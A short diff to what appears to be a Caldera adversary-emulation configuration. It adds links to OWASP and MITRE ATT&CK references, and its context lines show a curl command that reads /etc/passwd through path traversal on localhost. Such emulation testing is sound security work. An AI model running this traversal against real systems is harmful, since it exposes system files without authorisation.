@@ -31,3 +31,9 @@ caldera:
     description: "Read /etc/passwd via path traversal"
     command: |
       curl -sk "https://localhost:8000/files/../../../../etc/passwd" | head -5
+
+references:
+  - title: "OWASP Web Security Testing Guide"
+    url: https://owasp.org/www-project-web-security-testing-guide/
+  - title: "MITRE ATT&CK Enterprise techniques"
+    url: https://attack.mitre.org/techniques/enterprise/
